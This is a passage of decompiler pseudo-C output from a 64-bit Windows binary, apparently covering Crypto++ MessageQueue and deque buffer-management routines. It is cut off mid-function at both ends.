  *(_QWORD *)(a1 + 152) = v5;
  *v5 = 0i64;
  **(_QWORD **)(a1 + 152) = a1 + 152;
  sub_13F13CE50(a1 + 152, 1i64, &v7);
  return a1;
}
// 13F189088: using guessed type void *CryptoPP::MessageQueue::`vftable';
// 13F1891F8: using guessed type __int64 (__fastcall *off_13F1891F8[3])();

//----- (000000013F13C5B0) ----------------------------------------------------
__int64 __fastcall sub_13F13C5B0(_QWORD *a1)
{
  __int64 result; // rax

  result = sub_13F14088C(*a1, 16i64);
  *a1 = 0i64;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13C5E0) ----------------------------------------------------
__int64 __fastcall sub_13F13C5E0(_QWORD *a1)
{
  __int64 result; // rax

  sub_13F13E930(a1);
  result = sub_13F14088C(*a1, 16i64);
  *a1 = 0i64;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13C610) ----------------------------------------------------
__int64 __fastcall sub_13F13C610(_QWORD *a1)
{
  sub_13F13E930(a1 + 19);
  sub_13F14088C(a1[19], 16i64);
  a1[19] = 0i64;
  sub_13F13E930(a1 + 14);
  sub_13F14088C(a1[14], 16i64);
  a1[14] = 0i64;
  return sub_13F1315A0(a1 + 4);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13C678) ----------------------------------------------------
_QWORD *__fastcall sub_13F13C678(__int64 a1, char a2)
{
  return sub_13F13C690((_QWORD *)(a1 - 8), a2);
}

//----- (000000013F13C690) ----------------------------------------------------
_QWORD *__fastcall sub_13F13C690(_QWORD *a1, char a2)
{
  sub_13F13C610(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 192i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13C6D0) ----------------------------------------------------
bool __fastcall sub_13F13C6D0(__int64 a1)
{
  _QWORD *v1; // rdx

  v1 = *(_QWORD **)(a1 + 112);
  if ( v1 )
    v1 = (_QWORD *)*v1;
  return *(_QWORD *)(*(_QWORD *)(v1[1] + 8 * ((v1[2] - 1i64) & (*(_QWORD *)(a1 + 136) >> 1)))
                   + 8 * (*(_QWORD *)(a1 + 136) & 1i64)) != 0i64;
}

//----- (000000013F13C710) ----------------------------------------------------
__int64 __fastcall sub_13F13C710(_QWORD *a1, __int64 a2, _QWORD *a3, unsigned __int64 a4, __int64 a5, char a6)
{
  unsigned __int64 v11; // rax

  if ( *a3 >= (unsigned __int64)(*(__int64 (__fastcall **)(_QWORD *))(*a1 + 128i64))(a1) )
    return 0i64;
  v11 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 128i64))(a1);
  if ( a4 < v11 )
    v11 = a4;
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, _QWORD *, unsigned __int64, __int64, char))(a1[4] + 264i64))(
           a1 + 4,
           a2,
           a3,
           v11,
           a5,
           a6);
}

//----- (000000013F13C7A0) ----------------------------------------------------
char __fastcall sub_13F13C7A0(_QWORD *a1)
{
  __int64 *****v3; // rax
  __int64 ***v4; // rcx
  __int64 ****v5; // rax
  __int64 *v6; // rax
  __int64 v7; // rdx
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // rax

  if ( !(*(unsigned int (__fastcall **)(_QWORD *))(*a1 + 192i64))(a1)
    || (*(unsigned __int8 (__fastcall **)(_QWORD *))(*a1 + 136i64))(a1) )
  {
    return 0;
  }
  if ( a1[18]-- == 1i64 )
    a1[17] = 0i64;
  else
    ++a1[17];
  v3 = (__int64 *****)a1[19];
  v4 = 0i64;
  if ( v3 )
  {
    v5 = *v3;
    if ( v5 )
      v4 = *v5;
  }
  v6 = 0i64;
  if ( v4 && *v4 )
    v6 = **v4;
  v7 = 0i64;
  if ( v6 )
    v7 = *v6;
  if ( !*(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v7 + 8) + 8 * ((*(_QWORD *)(v7 + 16) - 1i64) & (a1[22] >> 2)))
                  + 4 * (a1[22] & 3i64)) )
  {
    v8 = a1[23];
    if ( v8 > 1 )
    {
      v9 = v8 - 1;
      a1[23] = v9;
      if ( !v9 )
      {
        a1[22] = 0i64;
        return 1;
      }
      ++a1[22];
    }
  }
  return 1;
}

//----- (000000013F13C890) ----------------------------------------------------
__int64 *__fastcall sub_13F13C890(_QWORD *a1)
{
  __int64 v2; // r8
  _QWORD **v3; // rcx
  __int64 v4; // rdx
  _QWORD **v5; // rax
  __int64 v6; // rcx
  _QWORD *v7; // rax
  __int64 v8; // r8
  _QWORD **v9; // rcx
  __int64 v10; // rdx
  _QWORD **v11; // rax
  __int64 v12; // rcx
  _QWORD *v13; // rax
  __int128 v15; // [rsp+20h] [rbp-50h] BYREF
  __int64 v16; // [rsp+30h] [rbp-40h]
  __int128 v17; // [rsp+38h] [rbp-38h] BYREF
  __int64 v18; // [rsp+48h] [rbp-28h]
  __int64 v19[4]; // [rsp+50h] [rbp-20h] BYREF
  __int64 v20; // [rsp+80h] [rbp+10h] BYREF

  (*(void (__fastcall **)(_QWORD *))(a1[4] + 64i64))(a1 + 4);
  v2 = a1[17];
  v3 = (_QWORD **)a1[14];
  v4 = v2 + a1[18];
  v20 = 0i64;
  v15 = 0i64;
  if ( v3 && *v3 )
    *(_QWORD *)&v15 = **v3;
  v16 = v4;
  v17 = 0i64;
  if ( v3 && *v3 )
    *(_QWORD *)&v17 = **v3;
  v18 = v2;
  sub_13F13EC50(a1 + 14, v19, (__int64)&v17, (__int64)&v15);
  v5 = (_QWORD **)a1[14];
  v6 = a1[17];
  v17 = 0i64;
  if ( v5 )
  {
    v7 = *v5;
    if ( v7 )
      *(_QWORD *)&v17 = *v7;
  }
  v18 = v6;
  sub_13F13DEA0((__int64 ******)a1 + 14, (__int64)&v17, 1ui64, &v20);
  LODWORD(v20) = 0;
  v8 = a1[22];
  v9 = (_QWORD **)a1[19];
  v10 = v8 + a1[23];
  v17 = 0i64;
  if ( v9 && *v9 )
    *(_QWORD *)&v17 = **v9;
  v18 = v10;
  v15 = 0i64;
  if ( v9 && *v9 )
    *(_QWORD *)&v15 = **v9;
  v16 = v8;
  sub_13F13EA90(a1 + 19, v19, (__int64)&v15, (__int64)&v17);
  v11 = (_QWORD **)a1[19];
  v12 = a1[22];
  v17 = 0i64;
  if ( v11 )
  {
    v13 = *v11;
    if ( v13 )
      *(_QWORD *)&v17 = *v13;
  }
  v18 = v12;
  return sub_13F13D3E0((__int64 ******)a1 + 19, (__int64)&v17, 1ui64, (unsigned int *)&v20);
}
// 13F13C890: using guessed type _QWORD var_20[4];

//----- (000000013F13CA20) ----------------------------------------------------
char __fastcall sub_13F13CA20(__int64 a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rcx
  __int64 v3; // rdx
  __int64 v4; // rcx
  unsigned __int64 v5; // rdi
  __int64 v6; // rax
  __int64 v7; // rsi

  v1 = (_QWORD *)(a1 + 152);
  v2 = *(_QWORD *)(a1 + 184);
  v3 = v1[3];
  if ( (((_BYTE)v2 + (_BYTE)v3) & 3) == 0 && v1[2] <= (unsigned __int64)(v2 + 4) >> 2 )
  {
    sub_13F13D020(v1, 1ui64);
    v3 = v1[3];
  }
  v4 = v3 & (4i64 * v1[2] - 1);
  v1[3] = v4;
  v5 = v4 + v1[4];
  v6 = v1[1];
  v7 = 8 * ((v1[2] - 1i64) & (v5 >> 2));
  if ( !*(_QWORD *)(v6 + v7) )
  {
    *(_QWORD *)(v7 + v1[1]) = sub_13F14059C(16i64);
    v6 = v1[1];
  }
  *(_DWORD *)(*(_QWORD *)(v7 + v6) + 4 * (v5 & 3)) = 0;
  ++v1[4];
  return 0;
}

//----- (000000013F13CAE0) ----------------------------------------------------
__int64 __fastcall sub_13F13CAE0(__int64 a1)
{
  _QWORD *v1; // rax

  v1 = *(_QWORD **)(a1 + 112);
  if ( v1 )
    v1 = (_QWORD *)*v1;
  return *(_QWORD *)(*(_QWORD *)(v1[1] + 8 * ((v1[2] - 1i64) & (*(_QWORD *)(a1 + 136) >> 1)))
                   + 8 * (*(_QWORD *)(a1 + 136) & 1i64));
}

//----- (000000013F13CB20) ----------------------------------------------------
__int64 __fastcall sub_13F13CB20(__int64 a1)
{
  return (unsigned int)(*(_DWORD *)(a1 + 184) - 1);
}

//----- (000000013F13CB30) ----------------------------------------------------
__int64 __fastcall sub_13F13CB30(__int64 a1)
{
  return (unsigned int)(*(_DWORD *)(a1 + 144) - 1);
}

//----- (000000013F13CB40) ----------------------------------------------------
__int64 __fastcall sub_13F13CB40(__int64 a1)
{
  __int64 *****v1; // rax
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 ***v4; // rcx
  __int64 ****v5; // rax
  __int64 *v6; // rax

  v1 = *(__int64 ******)(a1 + 152);
  v2 = 0i64;
  v3 = *(_QWORD *)(a1 + 176);
  v4 = 0i64;
  if ( v1 )
  {
    v5 = *v1;
    if ( v5 )
      v4 = *v5;
  }
  v6 = 0i64;
  if ( v4 && *v4 )
    v6 = **v4;
  if ( v6 )
    v2 = *v6;
  return *(unsigned int *)(*(_QWORD *)(*(_QWORD *)(v2 + 8) + 8 * ((*(_QWORD *)(v2 + 16) - 1i64) & (v3 >> 2)))
                         + 4 * (v3 & 3));
}

//----- (000000013F13CBB0) ----------------------------------------------------
__int64 __fastcall sub_13F13CBB0(_QWORD *a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v7; // rdi
  __int64 *****v8; // rax
  __int64 ***v9; // rcx
  __int64 ****v10; // rax
  unsigned __int64 v11; // r8
  __int64 *v12; // rax
  __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 v16; // rdx
  __int64 v17; // rcx
  unsigned __int64 v18; // rsi
  __int64 v19; // rax
  __int64 v20; // r14
  __int64 ***v21; // rcx
  __int64 *****v22; // rax
  __int64 ****v23; // rax
  unsigned __int64 v24; // rdx
  __int64 *v25; // rax
  __int64 v26; // rax

  (*(void (__fastcall **)(_QWORD *, __int64, __int64, _QWORD, char))(a1[4] + 48i64))(a1 + 4, a2, a3, 0i64, 1);
  v7 = 0i64;
  v8 = (__int64 *****)a1[14];
  v9 = 0i64;
  if ( v8 )
  {
    v10 = *v8;
    if ( v10 )
      v9 = *v10;
  }
  v11 = a1[18] + a1[17] - 1i64;
  v12 = 0i64;
  if ( v9 && *v9 )
    v12 = **v9;
  v13 = 0i64;
  if ( v12 )
    v13 = *v12;
  v14 = *(_QWORD *)(*(_QWORD *)(v13 + 8) + 8 * ((*(_QWORD *)(v13 + 16) - 1i64) & (v11 >> 1)));
  *(_QWORD *)(v14 + 8 * (v11 & 1)) += a3;
  if ( a4 )
  {
    v15 = a1[18];
    v16 = a1[17];
    if ( (((_BYTE)v15 + (_BYTE)v16) & 1) == 0 && a1[16] <= (unsigned __int64)(v15 + 2) >> 1 )
    {
      sub_13F13D200(a1 + 14, 1ui64);
      v16 = a1[17];
    }
    v17 = v16 & (2i64 * a1[16] - 1);
    a1[17] = v17;
    v18 = v17 + a1[18];
    v19 = a1[15];
    v20 = 8 * ((v18 >> 1) & (a1[16] - 1i64));
    if ( !*(_QWORD *)(v19 + v20) )
    {
      *(_QWORD *)(v20 + a1[15]) = sub_13F14059C(16i64);
      v19 = a1[15];
    }
    v21 = 0i64;
    *(_QWORD *)(*(_QWORD *)(v19 + v20) + 8 * (v18 & 1)) = 0i64;
    ++a1[18];
    v22 = (__int64 *****)a1[19];
    if ( v22 )
    {
      v23 = *v22;
      if ( v23 )
        v21 = *v23;
    }
    v24 = a1[22] + a1[23] - 1i64;
    v25 = 0i64;
    if ( v21 && *v21 )
      v25 = **v21;
    if ( v25 )
      v7 = *v25;
    v26 = *(_QWORD *)(*(_QWORD *)(v7 + 8) + 8 * ((*(_QWORD *)(v7 + 16) - 1i64) & (v24 >> 2)));
    ++*(_DWORD *)(v26 + 4 * (v24 & 3));
  }
  return 0i64;
}

//----- (000000013F13CD90) ----------------------------------------------------
__int64 __fastcall sub_13F13CD90(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 32) + 128i64))(a1 + 32);
}

//----- (000000013F13CDA0) ----------------------------------------------------
__int64 __fastcall sub_13F13CDA0(_QWORD *a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5)
{
  unsigned __int64 v9; // rax
  __int64 result; // rax
  _QWORD *v11; // rdx
  _QWORD *v12; // rcx

  v9 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 128i64))(a1);
  if ( *a3 < v9 )
    v9 = *a3;
  *a3 = v9;
  result = (*(__int64 (__fastcall **)(_QWORD *, __int64, unsigned __int64 *, __int64, char))(a1[4] + 256i64))(
             a1 + 4,
             a2,
             a3,
             a4,
             a5);
  v11 = (_QWORD *)a1[14];
  if ( v11 )
    v11 = (_QWORD *)*v11;
  v12 = (_QWORD *)(*(_QWORD *)(v11[1] + 8 * ((v11[2] - 1i64) & (a1[17] >> 1))) + 8 * (a1[17] & 1i64));
  *v12 -= *a3;
  return result;
}

//----- (000000013F13CE50) ----------------------------------------------------
void __fastcall sub_13F13CE50(__int64 a1, __int64 a2, _DWORD *a3)
{
  __int64 v6; // rcx
  unsigned __int64 v7; // rdi
  __int64 v8; // r14
  __int64 v9; // rcx

  while ( a2 )
  {
    v6 = *(_QWORD *)(a1 + 32);
    if ( ((*(_BYTE *)(a1 + 24) + (_BYTE)v6) & 3) == 0 && *(_QWORD *)(a1 + 16) <= (unsigned __int64)(v6 + 4) >> 2 )
      sub_13F13D020((_QWORD *)a1, 1ui64);
    *(_QWORD *)(a1 + 24) &= 4i64 * *(_QWORD *)(a1 + 16) - 1;
    v7 = *(_QWORD *)(a1 + 32) + *(_QWORD *)(a1 + 24);
    v8 = 8 * ((v7 >> 2) & (*(_QWORD *)(a1 + 16) - 1i64));
    v9 = *(_QWORD *)(a1 + 8);
    if ( !*(_QWORD *)(v9 + v8) )
    {
      *(_QWORD *)(v8 + *(_QWORD *)(a1 + 8)) = sub_13F14059C(16i64);
      v9 = *(_QWORD *)(a1 + 8);
    }
    *(_DWORD *)(*(_QWORD *)(v8 + v9) + 4 * (v7 & 3)) = *a3;
    ++*(_QWORD *)(a1 + 32);
    --a2;
  }
}

//----- (000000013F13CF40) ----------------------------------------------------
void __fastcall sub_13F13CF40(__int64 a1, __int64 a2, _QWORD *a3)
{
  __int64 v6; // rcx
  unsigned __int64 v7; // rdi
  __int64 v8; // r14
  __int64 v9; // rcx

  while ( a2 )
  {
    v6 = *(_QWORD *)(a1 + 32);
    if ( ((*(_BYTE *)(a1 + 24) + (_BYTE)v6) & 1) == 0 && *(_QWORD *)(a1 + 16) <= (unsigned __int64)(v6 + 2) >> 1 )
      sub_13F13D200((_QWORD *)a1, 1ui64);
    *(_QWORD *)(a1 + 24) &= 2i64 * *(_QWORD *)(a1 + 16) - 1;
    v7 = *(_QWORD *)(a1 + 32) + *(_QWORD *)(a1 + 24);
    v8 = 8 * ((v7 >> 1) & (*(_QWORD *)(a1 + 16) - 1i64));
    v9 = *(_QWORD *)(a1 + 8);
    if ( !*(_QWORD *)(v9 + v8) )
    {
      *(_QWORD *)(v8 + *(_QWORD *)(a1 + 8)) = sub_13F14059C(16i64);
      v9 = *(_QWORD *)(a1 + 8);
    }
    *(_QWORD *)(*(_QWORD *)(v8 + v9) + 8 * (v7 & 1)) = *a3;
    ++*(_QWORD *)(a1 + 32);
    --a2;
  }
}

//----- (000000013F13D020) ----------------------------------------------------
__int64 __fastcall sub_13F13D020(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // rax
  unsigned __int64 v5; // rsi
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // r15
  __int64 v8; // rcx
  __int64 v9; // rax
  __m128i *v10; // r14
  __int64 v11; // r12
  unsigned __int64 v12; // rbx
  const __m128i *v13; // rdx
  __m128i *v14; // rbx
  unsigned __int64 v15; // r8
  __int64 v16; // rcx
  __int64 result; // rax
  __int64 v18; // rcx
  unsigned __int64 v19; // rdx

  v2 = a1[2];
  v3 = 1i64;
  if ( v2 )
    v3 = a1[2];
  while ( 1 )
  {
    v5 = v3 - v2;
    if ( v3 - v2 >= a2 && v3 >= 8 )
      break;
    if ( 0xFFFFFFFFFFFFFFFi64 - v3 < v3 )
      sub_13F13E9F0();
    v3 *= 2i64;
  }
  v6 = 8 * v3;
  v7 = a1[3] >> 2;
  if ( v3 <= 0x1FFFFFFFFFFFFFFFi64 )
  {
    if ( v6 < 0x1000 )
    {
      if ( v6 )
        v10 = (__m128i *)sub_13F14059C(8 * v3);
      else
        v10 = 0i64;
      goto LABEL_17;
    }
  }
  else
  {
    v6 = -1i64;
  }
  v8 = v6 + 39;
  if ( v6 + 39 <= v6 )
    v8 = -1i64;
  v9 = sub_13F14059C(v8);
  if ( !v9 )
    goto LABEL_26;
  v10 = (__m128i *)((v9 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
  v10[-1].m128i_i64[1] = v9;
LABEL_17:
  v11 = 8 * v7;
  v12 = 8i64 * a1[2] - 8 * v7;
  sub_13F15EB00((__m128i *)((char *)v10 + 8 * v7), (const __m128i *)(a1[1] + 8 * v7), v12);
  v13 = (const __m128i *)a1[1];
  v14 = (__m128i *)((char *)v10 + 8 * v7 + v12);
  if ( v7 > v5 )
  {
    sub_13F15EB00(v14, v13, 8 * v5);
    sub_13F15EB00(v10, (const __m128i *)(8 * v5 + a1[1]), v11 - 8 * v5);
    v16 = (__int64)v10->m128i_i64 + v11 - 8 * v5;
    v15 = 8 * v5;
  }
  else
  {
    sub_13F15EB00(v14, v13, 8 * v7);
    sub_13F15EF70((__int64)&v14->m128i_i64[(unsigned __int64)v11 / 8], 0, 8 * (v5 - v7));
    v15 = 8 * v7;
    v16 = (__int64)v10;
  }
  result = sub_13F15EF70(v16, 0, v15);
  v18 = a1[1];
  if ( v18 )
  {
    v19 = 8i64 * a1[2];
    if ( v19 < 0x1000 )
    {
LABEL_24:
      result = sub_13F14088C(v18, v19);
      goto LABEL_25;
    }
    v19 += 39i64;
    if ( (unsigned __int64)(v18 - *(_QWORD *)(v18 - 8) - 8) <= 0x1F )
    {
      v18 = *(_QWORD *)(v18 - 8);
      goto LABEL_24;
    }
LABEL_26:
    sub_13F1682C0();
  }
LABEL_25:
  a1[1] = v10;
  a1[2] += v5;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13D200) ----------------------------------------------------
__int64 __fastcall sub_13F13D200(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // rax
  unsigned __int64 v5; // rsi
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // r15
  __int64 v8; // rcx
  __int64 v9; // rax
  __m128i *v10; // r14
  __int64 v11; // r12
  unsigned __int64 v12; // rbx
  const __m128i *v13; // rdx
  __m128i *v14; // rbx
  unsigned __int64 v15; // r8
  __int64 v16; // rcx
  __int64 result; // rax
  __int64 v18; // rcx
  unsigned __int64 v19; // rdx

  v2 = a1[2];
  v3 = 1i64;
  if ( v2 )
    v3 = a1[2];
  while ( 1 )
  {
    v5 = v3 - v2;
    if ( v3 - v2 >= a2 && v3 >= 8 )
      break;
    if ( 0xFFFFFFFFFFFFFFFi64 - v3 < v3 )
      sub_13F13E9F0();
    v3 *= 2i64;
  }
  v6 = 8 * v3;
  v7 = a1[3] >> 1;
  if ( v3 <= 0x1FFFFFFFFFFFFFFFi64 )
  {
    if ( v6 < 0x1000 )
    {
      if ( v6 )
        v10 = (__m128i *)sub_13F14059C(8 * v3);
      else
        v10 = 0i64;
      goto LABEL_17;
    }
  }
  else
  {
    v6 = -1i64;
  }
  v8 = v6 + 39;
  if ( v6 + 39 <= v6 )
    v8 = -1i64;
  v9 = sub_13F14059C(v8);
  if ( !v9 )
    goto LABEL_26;
  v10 = (__m128i *)((v9 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
  v10[-1].m128i_i64[1] = v9;
LABEL_17:
  v11 = 8 * v7;
  v12 = 8i64 * a1[2] - 8 * v7;
  sub_13F15EB00((__m128i *)((char *)v10 + 8 * v7), (const __m128i *)(a1[1] + 8 * v7), v12);
  v13 = (const __m128i *)a1[1];
  v14 = (__m128i *)((char *)v10 + 8 * v7 + v12);
  if ( v7 > v5 )
  {
    sub_13F15EB00(v14, v13, 8 * v5);
    sub_13F15EB00(v10, (const __m128i *)(8 * v5 + a1[1]), v11 - 8 * v5);
    v16 = (__int64)v10->m128i_i64 + v11 - 8 * v5;
    v15 = 8 * v5;
  }
  else
  {
    sub_13F15EB00(v14, v13, 8 * v7);
    sub_13F15EF70((__int64)&v14->m128i_i64[(unsigned __int64)v11 / 8], 0, 8 * (v5 - v7));
    v15 = 8 * v7;
    v16 = (__int64)v10;
  }
  result = sub_13F15EF70(v16, 0, v15);
  v18 = a1[1];
  if ( v18 )
  {
    v19 = 8i64 * a1[2];
    if ( v19 < 0x1000 )
    {
LABEL_24:
      result = sub_13F14088C(v18, v19);
      goto LABEL_25;
    }
    v19 += 39i64;
    if ( (unsigned __int64)(v18 - *(_QWORD *)(v18 - 8) - 8) <= 0x1F )
    {
      v18 = *(_QWORD *)(v18 - 8);
      goto LABEL_24;
    }
LABEL_26:
    sub_13F1682C0();
  }
LABEL_25:
  a1[1] = v10;
  a1[2] += v5;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13D3E0) ----------------------------------------------------
__int64 *__fastcall sub_13F13D3E0(__int64 ******a1, __int64 a2, unsigned __int64 a3, unsigned int *a4)
{
  unsigned __int64 v5; // r13
  _QWORD **v7; // rdi
  unsigned __int64 v8; // r12
  __int64 *****v9; // rsi
  char *v10; // r11
  unsigned __int64 v11; // r15
  unsigned __int64 k; // r15
  __int64 v13; // rax
  bool v14; // zf
  __int64 *****v15; // rsi
  __int64 *****v16; // rcx
  __int64 *****v17; // rsi
  unsigned __int64 v18; // r14
  __int64 *****v19; // rcx
  unsigned __int64 m; // r15
  __int64 *****v21; // rax
  __int64 ***v22; // rcx
  __int64 *****v23; // r9
  __int64 *v24; // rax
  __int64 v25; // rdx
  _DWORD *v26; // r12
  __int64 v27; // rax
  __int64 *****v28; // rsi
  __int64 *****v29; // rax
  __int64 *****v30; // rsi
  unsigned __int64 v31; // r14
  __int64 *****v32; // rcx
  __int64 *****v33; // rdx
  __int64 ****v34; // rax
  __int64 *v35; // rax
  __int64 *v36; // r9
  __int64 *result; // rax
  __int64 *****v38; // rax
  __int64 ***v39; // rcx
  __int64 *****v40; // r9
  __int64 *v41; // rax
  __int64 v42; // rdx
  _DWORD *v43; // r12
  __int64 v44; // rax
  __int64 *****v45; // rsi
  __int64 *****v46; // rax
  __int64 *****v47; // rsi
  unsigned __int64 v48; // r14
  __int64 *****v49; // rcx
  __int64 *****v50; // r8
  char *v51; // rdx
  __int64 *v52; // rax
  __int64 *v53; // r9
  unsigned int v54; // er14
  _QWORD **v55; // rax
  __int64 v56; // r12
  __int64 *****v57; // rsi
  _QWORD *v58; // rax
  _QWORD **v59; // rax
  _QWORD *v60; // rax
  __int64 *****v61; // rdx
  __int64 ***v62; // rcx
  __int64 ****v63; // rax
  __int64 *****v64; // r8
  unsigned __int64 i; // r13
  unsigned __int64 v66; // rsi
  unsigned __int64 v67; // r14
  __int64 *****v68; // rcx
  unsigned __int64 j; // r15
  __int64 *****v70; // rax
  __int64 ***v71; // rcx
  __int64 *****v72; // r9
  __int64 *v73; // rax
  __int64 v74; // rdx
  _DWORD *v75; // r12
  unsigned __int64 v76; // rsi
  unsigned __int64 v77; // r14
  __int64 *****v78; // rcx
  __int64 *****v79; // rdx
  __int64 ****v80; // rax
  __int64 *v81; // rax
  __int64 *v82; // r9
  unsigned int *v83; // r8
  unsigned __int64 v84; // r12
  __int64 *****v85; // r10
  __int64 *****v86; // rax
  __int64 ***v87; // rcx
  __int64 *****v88; // r9
  __int64 *v89; // rax
  __int64 v90; // r8
  _DWORD *v91; // r13
  unsigned __int64 v92; // r14
  unsigned __int64 v93; // r15
  __int64 *****v94; // rcx
  __int64 ****v95; // rax
  char *v96; // rbx
  __int64 *v97; // rax
  __int64 *v98; // r9
  __int64 **v99; // rcx
  _QWORD **v100; // rax
  _QWORD *v101; // rax
  _QWORD **v102; // rax
  _QWORD *v103; // rax
  __int128 v104; // [rsp+38h] [rbp-C8h] BYREF
  char *v105; // [rsp+48h] [rbp-B8h]
  __int128 v106; // [rsp+58h] [rbp-A8h] BYREF
  char *v107; // [rsp+68h] [rbp-98h]
  unsigned __int64 v108; // [rsp+70h] [rbp-90h]
  __int64 *v109; // [rsp+78h] [rbp-88h]
  __int128 v110; // [rsp+80h] [rbp-80h] BYREF
  char *v111; // [rsp+90h] [rbp-70h]
  __int64 *****v112; // [rsp+98h] [rbp-68h]
  _QWORD v113[12]; // [rsp+A0h] [rbp-60h] BYREF
  unsigned __int64 v114; // [rsp+110h] [rbp+10h] BYREF
  unsigned __int64 v115; // [rsp+118h] [rbp+18h]
  unsigned int *v116; // [rsp+120h] [rbp+20h]

  v116 = a4;
  v115 = a3;
  v113[3] = -2i64;
  v5 = a3;
  v7 = 0i64;
  v109 = 0i64;
  v8 = *(_QWORD *)(a2 + 16) - (_QWORD)a1[3];
  v114 = v8;
  v9 = a1[4];
  v112 = v9;
  v10 = (char *)v9 - v8;
  v108 = (unsigned __int64)v9 - v8;
  if ( v8 >= (unsigned __int64)v9 - v8 )
  {
    if ( (unsigned __int64)v10 >= a3 )
    {
      v84 = 0i64;
      v85 = v9;
      while ( 1 )
      {
        v86 = *a1;
        v87 = 0i64;
        if ( v84 >= v5 )
          break;
        v88 = a1[3];
        if ( v86 && *v86 )
          v87 = **v86;
        v89 = 0i64;
        if ( v87 && *v87 )
          v89 = **v87;
        v90 = 0i64;
        if ( v89 )
          v90 = *v89;
        v91 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(v90 + 8)
                                   + 8
                                   * ((((unsigned __int64)v88 + (_QWORD)v9 - v5 + v84) >> 2) & (*(_QWORD *)(v90 + 16)
                                                                                              - 1i64)))
                       + 4i64 * (((_DWORD)v84 + (_DWORD)v9 + (_DWORD)v88 - (_DWORD)v5) & 3));
        if ( (((_BYTE)v88 + (_BYTE)v85) & 3) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v85 + 4) >> 2 )
          sub_13F13D020(a1, 1ui64);
        a1[3] = (__int64 *****)((4i64 * (_QWORD)a1[2] - 1) & (unsigned __int64)a1[3]);
        v92 = (unsigned __int64)a1[3] + (_QWORD)a1[4];
        v93 = (v92 >> 2) & ((unsigned __int64)a1[2] - 1);
        v94 = a1[1];
        if ( !v94[v93] )
        {
          a1[1][v93] = (__int64 ****)sub_13F10D210((__int64)a1, 4ui64);
          v94 = a1[1];
        }
        *((_DWORD *)v94[v93] + (v92 & 3)) = *v91;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v85 = a1[4];
        ++v84;
        v5 = v115;
      }
      if ( v86 )
      {
        v95 = *v86;
        if ( v95 )
          v87 = *v95;
      }
      v96 = (char *)a1[3] + v114;
      v97 = 0i64;
      if ( v87 && *v87 )
        v97 = **v87;
      v98 = v109;
      if ( v109 != v97 )
      {
        v99 = (__int64 **)*v97;
        if ( *v97 )
        {
          v98 = *v99;
          v109 = *v99;
        }
      }
      LODWORD(v114) = *v116;
      v100 = 0i64;
      if ( v98 && *v98 )
        v100 = *(_QWORD ***)*v98;
      v110 = 0i64;
      if ( v100 )
      {
        v101 = *v100;
        if ( v101 )
          *(_QWORD *)&v110 = *v101;
      }
      v111 = &v96[v108];
      v102 = 0i64;
      if ( v98 && *v98 )
        v102 = *(_QWORD ***)*v98;
      v106 = 0i64;
      if ( v102 )
      {
        v103 = *v102;
        if ( v103 )
          *(_QWORD *)&v106 = *v103;
      }
      v107 = &v96[v108 - v5];
      v104 = 0i64;
      if ( v98 && *v98 )
        *(_QWORD *)&v104 = *(_QWORD *)*v98;
      v105 = v96;
      sub_13F13C240(v113, (__int64)&v104, (__int64)&v106, (__int64)&v110);
      if ( v109 && *v109 )
        v7 = *(_QWORD ***)*v109;
      v110 = 0i64;
      if ( v7 && *v7 )
        *(_QWORD *)&v110 = **v7;
      v111 = &v96[v5];
      v106 = 0i64;
      if ( v109 && *v109 )
        *(_QWORD *)&v106 = *(_QWORD *)*v109;
      v107 = v96;
      v83 = (unsigned int *)&v114;
    }
    else
    {
      for ( i = a3 - (_QWORD)v10; i; --i )
      {
        if ( ((*((_BYTE *)a1 + 24) + (_BYTE)v9) & 3) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 4) >> 2 )
          sub_13F13D020(a1, 1ui64);
        a1[3] = (__int64 *****)((4i64 * (_QWORD)a1[2] - 1) & (unsigned __int64)a1[3]);
        v66 = (unsigned __int64)a1[3] + (_QWORD)a1[4];
        v67 = (v66 >> 2) & ((unsigned __int64)a1[2] - 1);
        v68 = a1[1];
        if ( !v68[v67] )
        {
          a1[1][v67] = (__int64 ****)sub_13F14059C(16i64);
          v68 = a1[1];
        }
        *((_DWORD *)v68[v67] + (v66 & 3)) = *a4;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
      }
      for ( j = 0i64; ; ++j )
      {
        v70 = *a1;
        v71 = 0i64;
        if ( j >= v108 )
          break;
        v72 = a1[3];
        if ( v70 && *v70 )
          v71 = **v70;
        v73 = 0i64;
        if ( v71 && *v71 )
          v73 = **v71;
        v74 = 0i64;
        if ( v73 )
          v74 = *v73;
